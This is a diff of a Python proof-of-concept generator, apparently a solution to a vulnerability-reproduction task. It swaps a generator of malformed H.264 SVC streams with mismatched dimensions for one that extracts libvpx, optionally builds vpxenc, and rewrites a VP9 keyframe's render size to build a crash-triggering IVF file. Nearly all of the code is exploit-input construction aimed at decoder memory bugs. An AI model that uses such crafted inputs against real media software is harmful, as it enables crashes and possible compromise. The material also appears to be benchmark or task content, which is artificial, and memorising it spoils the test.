@@ -1,324 +1,430 @@
 import os
 import re
+import io
+import sys
 import tarfile
-from dataclasses import dataclass
-from typing import Optional, Tuple
+import time
+import shutil
+import struct
+import tempfile
+import subprocess
+from typing import Optional, Tuple, List
 
 
-class _BitWriter:
-    __slots__ = ("_buf", "_cur", "_nbits")
+class _BitReaderMSB:
+    __slots__ = ("_data", "_byte_pos", "_bit_pos", "_total_bits")
 
-    def __init__(self) -> None:
-        self._buf = bytearray()
+    def __init__(self, data: bytes):
+        self._data = data
+        self._byte_pos = 0
+        self._bit_pos = 0
+        self._total_bits = len(data) * 8
+
+    def bits_left(self) -> int:
+        return self._total_bits - (self._byte_pos * 8 + self._bit_pos)
+
+    def read_bit(self) -> int:
+        if self._byte_pos >= len(self._data):
+            raise EOFError
+        b = self._data[self._byte_pos]
+        bit = (b >> (7 - self._bit_pos)) & 1
+        self._bit_pos += 1
+        if self._bit_pos == 8:
+            self._bit_pos = 0
+            self._byte_pos += 1
+        return bit
+
+    def read_bits(self, n: int) -> int:
+        v = 0
+        for _ in range(n):
+            v = (v << 1) | self.read_bit()
+        return v
+
+
+class _BitWriterMSB:
+    __slots__ = ("_out", "_cur", "_bit_pos")
+
+    def __init__(self):
+        self._out = bytearray()
         self._cur = 0
-        self._nbits = 0
+        self._bit_pos = 0
+
+    def write_bit(self, bit: int) -> None:
+        if bit & 1:
+            self._cur |= 1 << (7 - self._bit_pos)
+        self._bit_pos += 1
+        if self._bit_pos == 8:
+            self._out.append(self._cur)
+            self._cur = 0
+            self._bit_pos = 0
 
     def write_bits(self, v: int, n: int) -> None:
-        if n <= 0:
-            return
-        v &= (1 << n) - 1
-        while n > 0:
-            take = min(8 - self._nbits, n)
-            shift = n - take
-            bits = (v >> shift) & ((1 << take) - 1)
-            self._cur = (self._cur << take) | bits
-            self._nbits += take
-            n -= take
-            if self._nbits == 8:
-                self._buf.append(self._cur & 0xFF)
-                self._cur = 0
-                self._nbits = 0
+        for i in range(n - 1, -1, -1):
+            self.write_bit((v >> i) & 1)
 
-    def write_bit(self, b: int) -> None:
-        self.write_bits(1 if b else 0, 1)
-
-    def write_ue(self, k: int) -> None:
-        if k < 0:
-            k = 0
-        code_num = k + 1
-        bl = code_num.bit_length()
-        leading_zeros = bl - 1
-        if leading_zeros:
-            self.write_bits(0, leading_zeros)
-        self.write_bits(code_num, bl)
-
-    def write_se(self, v: int) -> None:
-        if v <= 0:
-            code_num = -2 * v
-        else:
-            code_num = 2 * v - 1
-        self.write_ue(code_num)
-
-    def byte_align_zero(self) -> None:
-        if self._nbits:
-            self.write_bits(0, 8 - self._nbits)
-
-    def rbsp_trailing_bits(self) -> None:
-        self.write_bit(1)
-        self.byte_align_zero()
-
-    def finish(self) -> bytes:
-        if self._nbits:
-            self._cur <<= (8 - self._nbits)
-            self._buf.append(self._cur & 0xFF)
-            self._cur = 0
-            self._nbits = 0
-        return bytes(self._buf)
+    def get_bytes(self) -> bytes:
+        if self._bit_pos:
+            self._out.append(self._cur)
+        return bytes(self._out)
 
 
-def _rbsp_to_ebsp(rbsp: bytes) -> bytes:
-    out = bytearray()
-    zeros = 0
-    for b in rbsp:
-        if zeros >= 2 and b <= 3:
-            out.append(3)
-            zeros = 0
-        out.append(b)
-        if b == 0:
-            zeros += 1
-        else:
-            zeros = 0
-    return bytes(out)
-
-
-def _make_nal(nal_unit_type: int, rbsp: bytes, nal_ref_idc: int = 3, long_start_code: bool = True) -> bytes:
-    hdr = ((nal_ref_idc & 3) << 5) | (nal_unit_type & 0x1F)
-    start = b"\x00\x00\x00\x01" if long_start_code else b"\x00\x00\x01"
-    return start + bytes([hdr]) + _rbsp_to_ebsp(rbsp)
-
-
-def _build_sps_rbsp(profile_idc: int, level_idc: int, sps_id: int, width_mbs: int, height_mbs: int) -> bytes:
-    bw = _BitWriter()
-    bw.write_bits(profile_idc & 0xFF, 8)
-    bw.write_bits(0, 8)  # constraint flags + reserved
-    bw.write_bits(level_idc & 0xFF, 8)
-    bw.write_ue(sps_id)
-
-    # For profiles including scalable baseline/high, the "high profile" fields are present.
-    if profile_idc in (100, 110, 122, 244, 44, 83, 86, 118, 128, 138, 139, 134, 135):
-        bw.write_ue(1)  # chroma_format_idc (4:2:0)
-        bw.write_ue(0)  # bit_depth_luma_minus8
-        bw.write_ue(0)  # bit_depth_chroma_minus8
-        bw.write_bit(0)  # qpprime_y_zero_transform_bypass_flag
-        bw.write_bit(0)  # seq_scaling_matrix_present_flag
-
-    bw.write_ue(0)  # log2_max_frame_num_minus4 (=> 4 bits)
-    bw.write_ue(0)  # pic_order_cnt_type
-    bw.write_ue(0)  # log2_max_pic_order_cnt_lsb_minus4 (=> 4 bits)
-    bw.write_ue(1)  # max_num_ref_frames
-    bw.write_bit(0)  # gaps_in_frame_num_value_allowed_flag
-    bw.write_ue(max(0, width_mbs - 1))
-    bw.write_ue(max(0, height_mbs - 1))
-    bw.write_bit(1)  # frame_mbs_only_flag
-    bw.write_bit(1)  # direct_8x8_inference_flag
-    bw.write_bit(0)  # frame_cropping_flag
-    bw.write_bit(0)  # vui_parameters_present_flag
-    bw.rbsp_trailing_bits()
-    return bw.finish()
-
-
-def _build_subset_sps_rbsp(profile_idc: int, level_idc: int, sps_id: int, width_mbs: int, height_mbs: int) -> bytes:
-    bw = _BitWriter()
-    bw.write_bits(profile_idc & 0xFF, 8)
-    bw.write_bits(0, 8)  # constraint flags + reserved
-    bw.write_bits(level_idc & 0xFF, 8)
-    bw.write_ue(sps_id)
-
-    chroma_format_idc = 1
-    if profile_idc in (100, 110, 122, 244, 44, 83, 86, 118, 128, 138, 139, 134, 135):
-        bw.write_ue(chroma_format_idc)
-        bw.write_ue(0)  # bit_depth_luma_minus8
-        bw.write_ue(0)  # bit_depth_chroma_minus8
-        bw.write_bit(0)  # qpprime_y_zero_transform_bypass_flag
-        bw.write_bit(0)  # seq_scaling_matrix_present_flag
-
-    bw.write_ue(0)  # log2_max_frame_num_minus4
-    bw.write_ue(0)  # pic_order_cnt_type
-    bw.write_ue(0)  # log2_max_pic_order_cnt_lsb_minus4
-    bw.write_ue(1)  # max_num_ref_frames
-    bw.write_bit(0)  # gaps_in_frame_num_value_allowed_flag
-    bw.write_ue(max(0, width_mbs - 1))
-    bw.write_ue(max(0, height_mbs - 1))
-    bw.write_bit(1)  # frame_mbs_only_flag
-    bw.write_bit(1)  # direct_8x8_inference_flag
-    bw.write_bit(0)  # frame_cropping_flag
-    bw.write_bit(0)  # vui_parameters_present_flag (in seq_parameter_set_data)
-
-    # SVC extension for scalable profiles (Annex G)
-    if profile_idc in (83, 86):
-        bw.write_bit(0)  # inter_layer_deblocking_filter_control_present_flag
-        bw.write_bits(0, 2)  # extended_spatial_scalability_idc
-        # chroma phase fields (for chroma_format_idc 1 or 2)
-        bw.write_bit(0)  # chroma_phase_x_plus1_flag
-        bw.write_bits(0, 2)  # chroma_phase_y_plus1
-        bw.write_bit(0)  # seq_tcoeff_level_prediction_flag
-        bw.write_bit(0)  # slice_header_restriction_flag
-        bw.write_bit(0)  # svc_vui_parameters_present_flag
-
-    bw.write_bit(0)  # additional_extension2_flag
-    bw.rbsp_trailing_bits()
-    return bw.finish()
-
-
-def _build_pps_rbsp(pps_id: int, sps_id: int) -> bytes:
-    bw = _BitWriter()
-    bw.write_ue(pps_id)
-    bw.write_ue(sps_id)
-    bw.write_bit(0)  # entropy_coding_mode_flag (CAVLC)
-    bw.write_bit(0)  # bottom_field_pic_order_in_frame_present_flag
-    bw.write_ue(0)  # num_slice_groups_minus1
-    bw.write_ue(0)  # num_ref_idx_l0_default_active_minus1
-    bw.write_ue(0)  # num_ref_idx_l1_default_active_minus1
-    bw.write_bit(0)  # weighted_pred_flag
-    bw.write_bits(0, 2)  # weighted_bipred_idc
-    bw.write_se(0)  # pic_init_qp_minus26
-    bw.write_se(0)  # pic_init_qs_minus26
-    bw.write_se(0)  # chroma_qp_index_offset
-    bw.write_bit(1)  # deblocking_filter_control_present_flag
-    bw.write_bit(0)  # constrained_intra_pred_flag
-    bw.write_bit(0)  # redundant_pic_cnt_present_flag
-    bw.rbsp_trailing_bits()
-    return bw.finish()
-
-
-def _build_aud_rbsp(primary_pic_type: int = 0) -> bytes:
-    bw = _BitWriter()
-    bw.write_bits(primary_pic_type & 7, 3)
-    bw.rbsp_trailing_bits()
-    return bw.finish()
-
-
-def _build_idr_slice_rbsp(frame_num: int, poc_lsb: int, pps_id: int, num_mbs: int) -> bytes:
-    bw = _BitWriter()
-    bw.write_ue(0)  # first_mb_in_slice
-    bw.write_ue(2)  # slice_type = I
-    bw.write_ue(pps_id)
-    bw.write_bits(frame_num & 0xF, 4)  # frame_num (log2_max_frame_num_minus4=0)
-    bw.write_ue(0)  # idr_pic_id
-    bw.write_bits(poc_lsb & 0xF, 4)  # pic_order_cnt_lsb (log2_max_pic_order_cnt_lsb_minus4=0)
-    # dec_ref_pic_marking (IDR)
-    bw.write_bit(0)  # no_output_of_prior_pics_flag
-    bw.write_bit(0)  # long_term_reference_flag
-    bw.write_se(0)  # slice_qp_delta
-    bw.write_ue(0)  # disable_deblocking_filter_idc
-    bw.write_se(0)  # slice_alpha_c0_offset_div2
-    bw.write_se(0)  # slice_beta_offset_div2
-
-    # Macroblocks: I_PCM
-    pcm = b"\x00" * (256 + 64 + 64)  # 8-bit 4:2:0
-    for _ in range(max(1, num_mbs)):
-        bw.write_ue(25)  # I_PCM mb_type in I-slice
-        bw.byte_align_zero()  # pcm_alignment_zero_bit
-        for b in pcm:
-            bw.write_bits(b, 8)
-
-    bw.rbsp_trailing_bits()
-    return bw.finish()
-
-
-def _gen_poc_h264_svc_mismatch() -> bytes:
-    # Create mismatch between "display" dimensions (from an earlier SPS/SUBSET SPS)
-    # and later subset sequence dimensions by changing subset SPS midstream.
-    profile_idc = 83  # scalable baseline
-    level_idc = 10
-    sps_id = 0
-    pps_id = 0
-
-    # Large "display" dimensions: 256x256 => 16x16 MBs
-    sps_large = _build_sps_rbsp(profile_idc, level_idc, sps_id, 16, 16)
-    subset_large = _build_subset_sps_rbsp(profile_idc, level_idc, sps_id, 16, 16)
-
-    # Small subset dimensions: 16x16 => 1x1 MB
-    subset_small = _build_subset_sps_rbsp(profile_idc, level_idc, sps_id, 1, 1)
-
-    pps = _build_pps_rbsp(pps_id, sps_id)
-    aud = _build_aud_rbsp(0)
-
-    slice_small = _build_idr_slice_rbsp(frame_num=0, poc_lsb=0, pps_id=pps_id, num_mbs=1)
-
-    stream = bytearray()
-    stream += _make_nal(7, sps_large, nal_ref_idc=3)
-    stream += _make_nal(15, subset_large, nal_ref_idc=3)
-    stream += _make_nal(15, subset_small, nal_ref_idc=3)
-    stream += _make_nal(8, pps, nal_ref_idc=3)
-    stream += _make_nal(9, aud, nal_ref_idc=0)
-    stream += _make_nal(5, slice_small, nal_ref_idc=3)
-    return bytes(stream)
-
-
-def _looks_like_h264_annexb(data: bytes) -> int:
-    if len(data) < 64:
-        return 0
-    score = 0
-    if b"\x00\x00\x00\x01" in data or b"\x00\x00\x01" in data:
-        score += 10
-    if b"\x00\x00\x00\x01\x6f" in data or b"\x00\x00\x01\x6f" in data:
-        score += 50  # subset SPS header
-    if b"\x00\x00\x00\x01\x67" in data or b"\x00\x00\x01\x67" in data:
-        score += 10
-    if b"\x00\x00\x00\x01\x65" in data or b"\x00\x00\x01\x65" in data:
-        score += 10
-    return score
-
-
-def _select_embedded_poc_from_tar(src_path: str) -> Optional[bytes]:
-    try:
-        tf = tarfile.open(src_path, "r:*")
-    except Exception:
-        return None
-
-    best: Tuple[int, Optional[bytes]] = (0, None)
-    target_len = 6180
-
-    try:
-        members = tf.getmembers()
-        for m in members:
-            if not m.isreg():
-                continue
-            if m.size < 64 or m.size > 200000:
-                continue
-            name = m.name.lower()
-            name_score = 0
-            if any(k in name for k in ("clusterfuzz", "crash", "poc", "repro", "oss-fuzz")):
-                name_score += 100
-            if any(name.endswith(ext) for ext in (".264", ".h264", ".avc", ".svc", ".bin", ".dat", ".raw")):
-                name_score += 40
-            if "test" in name or "corpus" in name or "fuzz" in name:
-                name_score += 10
-
-            if name_score == 0 and m.size > 20000:
-                continue
-
-            f = tf.extractfile(m)
-            if f is None:
-                continue
-            try:
-                data = f.read()
-            except Exception:
-                continue
-
-            fmt_score = _looks_like_h264_annexb(data)
-            if fmt_score == 0 and name_score < 100:
-                continue
-
-            size_bonus = max(0, 40 - (abs(len(data) - target_len) // 200))
-            total = name_score + fmt_score + size_bonus
-            if total > best[0]:
-                best = (total, data)
-    finally:
+def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
+    base = os.path.realpath(path)
+    for m in tar.getmembers():
+        name = m.name
+        if not name or name.startswith("/") or name.startswith("\\"):
+            continue
+        dest = os.path.realpath(os.path.join(path, name))
+        if not (dest == base or dest.startswith(base + os.sep)):
+            continue
         try:
-            tf.close()
+            tar.extract(m, path=path, set_attrs=False)
         except Exception:
             pass
 
-    return best[1]
+
+def _maybe_get_repo_root(extract_dir: str) -> str:
+    try:
+        entries = [e for e in os.listdir(extract_dir) if e not in (".", "..")]
+    except Exception:
+        return extract_dir
+    dirs = [e for e in entries if os.path.isdir(os.path.join(extract_dir, e))]
+    files = [e for e in entries if os.path.isfile(os.path.join(extract_dir, e))]
+    if len(dirs) == 1 and not files:
+        return os.path.join(extract_dir, dirs[0])
+    return extract_dir
+
+
+def _find_files_by_name(root: str, names: Tuple[str, ...]) -> List[str]:
+    out = []
+    names_set = set(n.lower() for n in names)
+    for dp, _, fns in os.walk(root):
+        for fn in fns:
+            if fn.lower() in names_set:
+                out.append(os.path.join(dp, fn))
+    return out
+
+
+def _is_likely_libvpx(root: str) -> bool:
+    if os.path.isfile(os.path.join(root, "configure")):
+        if os.path.exists(os.path.join(root, "vpx")) or os.path.exists(os.path.join(root, "vpx_ports")):
+            return True
+    return False
+
+
+def _read_file(path: str, max_bytes: Optional[int] = None) -> bytes:
+    with open(path, "rb") as f:
+        if max_bytes is None:
+            return f.read()
+        return f.read(max_bytes)
+
+
+def _locate_ivf_candidate(root: str, max_size: int = 300000) -> Optional[str]:
+    best = None
+    best_sz = None
+    for dp, _, fns in os.walk(root):
+        for fn in fns:
+            if not fn.lower().endswith(".ivf"):
+                continue
+            p = os.path.join(dp, fn)
+            try:
+                st = os.stat(p)
+            except Exception:
+                continue
+            if st.st_size <= 0 or st.st_size > max_size:
+                continue
+            try:
+                head = _read_file(p, 32)
+            except Exception:
+                continue
+            if len(head) < 32 or head[:4] != b"DKIF":
+                continue
+            fourcc = head[8:12]
+            if fourcc not in (b"VP90", b"VP80", b"AV01"):
+                continue
+            if best is None or st.st_size < best_sz:
+                best = p
+                best_sz = st.st_size
+    return best
+
+
+def _ivf_patch_dims(ivf: bytes, w: int, h: int) -> bytes:
+    if len(ivf) < 32 or ivf[:4] != b"DKIF":
+        return ivf
+    b = bytearray(ivf)
+    b[12:14] = struct.pack("<H", w & 0xFFFF)
+    b[14:16] = struct.pack("<H", h & 0xFFFF)
+    return bytes(b)
+
+
+def _ivf_parse_frames(ivf: bytes) -> Tuple[bytes, List[Tuple[int, int, bytes]]]:
+    if len(ivf) < 32 or ivf[:4] != b"DKIF":
+        raise ValueError("not ivf")
+    header = ivf[:32]
+    frames = []
+    off = 32
+    n = 0
+    while off + 12 <= len(ivf):
+        sz = struct.unpack_from("<I", ivf, off)[0]
+        ts = struct.unpack_from("<Q", ivf, off + 4)[0]
+        off += 12
+        if off + sz > len(ivf):
+            break
+        payload = ivf[off:off + sz]
+        frames.append((sz, ts, payload))
+        off += sz
+        n += 1
+        if n > 1024:
+            break
+    return header, frames
+
+
+def _ivf_rebuild(header: bytes, frames: List[Tuple[int, int, bytes]]) -> bytes:
+    out = bytearray(header)
+    for _, ts, payload in frames:
+        out += struct.pack("<I", len(payload))
+        out += struct.pack("<Q", ts)
+        out += payload
+    return bytes(out)
+
+
+def _vp9_add_or_set_render_size(frame: bytes, render_w: int, render_h: int) -> bytes:
+    if render_w < 1 or render_h < 1:
+        return frame
+
+    br = _BitReaderMSB(frame)
+    bw = _BitWriterMSB()
+    try:
+        frame_marker = br.read_bits(2)
+        bw.write_bits(frame_marker, 2)
+
+        profile_low = br.read_bits(1)
+        profile_high = br.read_bits(1)
+        bw.write_bits(profile_low, 1)
+        bw.write_bits(profile_high, 1)
+        profile = profile_low | (profile_high << 1)
+
+        if profile == 3:
+            reserved = br.read_bits(1)
+            bw.write_bits(reserved, 1)
+
+        show_existing_frame = br.read_bits(1)
+        bw.write_bits(show_existing_frame, 1)
+        if show_existing_frame != 0:
+            return frame
+
+        frame_type = br.read_bits(1)
+        show_frame = br.read_bits(1)
+        error_resilient_mode = br.read_bits(1)
+        bw.write_bits(frame_type, 1)
+        bw.write_bits(show_frame, 1)
+        bw.write_bits(error_resilient_mode, 1)
+
+        if frame_marker != 2:
+            return frame
+
+        if frame_type != 0:
+            return frame
+
+        sync = br.read_bits(24)
+        bw.write_bits(sync, 24)
+        if sync != 0x498342:
+            return frame
+
+        color_space = br.read_bits(3)
+        bw.write_bits(color_space, 3)
+
+        if color_space != 7:
+            color_range = br.read_bits(1)
+            bw.write_bits(color_range, 1)
+            if profile in (1, 3):
+                subx = br.read_bits(1)
+                suby = br.read_bits(1)
+                rsv = br.read_bits(1)
+                bw.write_bits(subx, 1)
+                bw.write_bits(suby, 1)
+                bw.write_bits(rsv, 1)
+        else:
+            if profile in (1, 3):
+                color_range = br.read_bits(1)
+                subx = br.read_bits(1)
+                suby = br.read_bits(1)
+                rsv = br.read_bits(1)
+                bw.write_bits(color_range, 1)
+                bw.write_bits(subx, 1)
+                bw.write_bits(suby, 1)
+                bw.write_bits(rsv, 1)
+
+        w_minus_1 = br.read_bits(16)
+        h_minus_1 = br.read_bits(16)
+        bw.write_bits(w_minus_1, 16)
+        bw.write_bits(h_minus_1, 16)
+
+        render_diff = br.read_bits(1)
+        bw.write_bits(1, 1)
+
+        if render_diff == 1:
+            _ = br.read_bits(16)
+            _ = br.read_bits(16)
+
+        bw.write_bits((render_w - 1) & 0xFFFF, 16)
+        bw.write_bits((render_h - 1) & 0xFFFF, 16)
+
+        while br.bits_left() > 0:
+            bw.write_bit(br.read_bit())
+
+        return bw.get_bytes()
+    except Exception:
+        return frame
+
+
+def _build_libvpx_vpxenc(src_root: str, work_dir: str, jobs: int = 8) -> Optional[str]:
+    configure = os.path.join(src_root, "configure")
+    if not os.path.isfile(configure):
+        return None
+
+    build_dir = os.path.join(work_dir, "build_libvpx")
+    os.makedirs(build_dir, exist_ok=True)
+
+    try:
+        st = os.stat(configure)
+        if not (st.st_mode & 0o111):
+            os.chmod(configure, st.st_mode | 0o111)
+    except Exception:
+        pass
+
+    candidates = [
+        ["bash", configure, "--target=generic-gnu", "--enable-vp9", "--disable-vp8", "--disable-unit-tests", "--disable-examples", "--disable-docs", "--enable-tools", "--disable-shared", "--enable-static", "--enable-small"],
+        ["bash", configure, "--target=generic-gnu", "--enable-vp9", "--disable-unit-tests", "--disable-examples", "--disable-docs", "--enable-tools", "--disable-shared", "--enable-static", "--enable-small"],
+        ["bash", configure, "--target=generic-gnu", "--enable-vp9", "--disable-unit-tests", "--disable-examples", "--disable-docs", "--enable-tools", "--disable-shared", "--enable-static"],
+        ["bash", configure, "--target=generic-gnu", "--enable-vp9", "--disable-unit-tests", "--disable-examples", "--disable-docs", "--enable-tools"],
+    ]
+
+    env = os.environ.copy()
+    env.setdefault("CFLAGS", "-O0 -g0")
+    env.setdefault("CXXFLAGS", "-O0 -g0")
+
+    ok = False
+    for cmd in candidates:
+        try:
+            r = subprocess.run(cmd, cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=600)
+            if r.returncode == 0:
+                ok = True
+                break
+        except Exception:
+            continue
+    if not ok:
+        return None
+
+    try:
+        r = subprocess.run(["make", f"-j{max(1, jobs)}", "vpxenc"], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=900)
+        if r.returncode != 0:
+            r = subprocess.run(["make", f"-j{max(1, jobs)}"], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=900)
+            if r.returncode != 0:
+                return None
+    except Exception:
+        return None
+
+    vpxenc = os.path.join(build_dir, "vpxenc")
+    if os.path.isfile(vpxenc):
+        return vpxenc
+    vpxenc = os.path.join(build_dir, "vpxenc.exe")
+    if os.path.isfile(vpxenc):
+        return vpxenc
+    return None
+
+
+def _run_vpxenc_make_ivf(vpxenc_path: str, work_dir: str, w: int, h: int) -> Optional[bytes]:
+    y4m_path = os.path.join(work_dir, "in.y4m")
+    out_path = os.path.join(work_dir, "out.ivf")
+
+    y_plane = bytes([0]) * (w * h)
+    uv_plane = bytes([128]) * ((w // 2) * (h // 2))
+    header = f"YUV4MPEG2 W{w} H{h} F1:1 Ip A1:1 C420\n".encode("ascii")
+    frame_hdr = b"FRAME\n"
+    with open(y4m_path, "wb") as f:
+        f.write(header)
+        f.write(frame_hdr)
+        f.write(y_plane)
+        f.write(uv_plane)
+        f.write(uv_plane)
+
+    cmd_variants = [
+        [vpxenc_path, "--codec=vp9", "--ivf", "--limit=1", "--kf-max-dist=1", "--lag-in-frames=0", "--end-usage=q", "--cq-level=63", "--cpu-used=8", "--threads=1", "-o", out_path, y4m_path],
+        [vpxenc_path, "--codec=vp9", "--ivf", "--limit=1", "--kf-max-dist=1", "--lag-in-frames=0", "--end-usage=q", "--cq-level=63", "--cpu-used=5", "--threads=1", "-o", out_path, y4m_path],
+        [vpxenc_path, "--codec=vp9", "--ivf", "--limit=1", "--kf-max-dist=1", "--lag-in-frames=0", "--good", "--cpu-used=8", "--threads=1", "-o", out_path, y4m_path],
+        [vpxenc_path, "--codec=vp9", "--ivf", "--limit=1", "--kf-max-dist=1", "--lag-in-frames=0", "-o", out_path, y4m_path],
+    ]
+
+    for cmd in cmd_variants:
+        try:
+            r = subprocess.run(cmd, cwd=work_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
+            if r.returncode == 0 and os.path.isfile(out_path):
+                data = _read_file(out_path)
+                if data[:4] == b"DKIF":
+                    return data
+        except Exception:
+            continue
+    return None
 
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        data = None
-        if isinstance(src_path, str) and os.path.exists(src_path) and os.path.isfile(src_path):
-            data = _select_embedded_poc_from_tar(src_path)
-        if data is not None:
-            return data
-        return _gen_poc_h264_svc_mismatch()
+        work_dir = tempfile.mkdtemp(prefix="pocgen_")
+        extract_dir = os.path.join(work_dir, "src")
+        os.makedirs(extract_dir, exist_ok=True)
+
+        try:
+            if os.path.isdir(src_path):
+                src_root = src_path
+            else:
+                with tarfile.open(src_path, "r:*") as tar:
+                    _safe_extract_tar(tar, extract_dir)
+                src_root = _maybe_get_repo_root(extract_dir)
+
+            ivf_candidate = _locate_ivf_candidate(src_root)
+            if ivf_candidate:
+                ivf = _read_file(ivf_candidate)
+                try:
+                    header, frames = _ivf_parse_frames(ivf)
+                    if frames:
+                        sz, ts, payload = frames[0]
+                        new_payload = _vp9_add_or_set_render_size(payload, 16, 16)
+                        frames[0] = (len(new_payload), ts, new_payload)
+                        new_ivf = _ivf_rebuild(header, frames)
+                        new_ivf = _ivf_patch_dims(new_ivf, 16, 16)
+                        return new_ivf
+                except Exception:
+                    ivf = _ivf_patch_dims(ivf, 16, 16)
+                    return ivf
+
+            if _is_likely_libvpx(src_root):
+                vpxenc = _build_libvpx_vpxenc(src_root, work_dir, jobs=min(8, (os.cpu_count() or 2)))
+                if vpxenc:
+                    ivf = _run_vpxenc_make_ivf(vpxenc, work_dir, w=64, h=64)
+                    if ivf and ivf[:4] == b"DKIF":
+                        try:
+                            header, frames = _ivf_parse_frames(ivf)
+                            if frames:
+                                sz, ts, payload = frames[0]
+                                new_payload = _vp9_add_or_set_render_size(payload, 16, 16)
+                                frames[0] = (len(new_payload), ts, new_payload)
+                                out = _ivf_rebuild(header, frames)
+                                out = _ivf_patch_dims(out, 16, 16)
+                                return out
+                        except Exception:
+                            return _ivf_patch_dims(ivf, 16, 16)
+
+            fallback = bytearray()
+            fallback += b"DKIF"
+            fallback += struct.pack("<HH", 0, 32)
+            fallback += b"VP90"
+            fallback += struct.pack("<HH", 16, 16)
+            fallback += struct.pack("<IIII", 1, 1, 1, 0)
+            fallback += struct.pack("<I", 0) + struct.pack("<Q", 0)
+            return bytes(fallback)
+        finally:
+            try:
+                shutil.rmtree(work_dir, ignore_errors=True)
+            except Exception:
+                pass
